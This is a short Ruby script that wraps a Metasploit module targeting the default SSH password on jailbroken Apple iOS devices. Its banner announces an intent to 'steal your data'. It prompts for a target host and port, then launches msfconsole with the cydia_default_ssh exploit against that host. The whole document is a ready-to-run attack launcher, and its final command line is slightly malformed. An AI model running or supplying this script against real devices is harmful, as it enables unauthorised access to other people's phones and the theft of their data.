puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

	     Apple iOS Default SSH Password Vulnerability

		       Apple iOS
		The target ports: 
  						 SSH_PORT  22
"""

puts " [?] What is the Target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Default is 22]  "
print "[!] ---> "

port = gets.chomp



exec("msfconsole -x 'use exploit/apple_ios/ssh/cydia_default_ssh ' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run' 'run'")
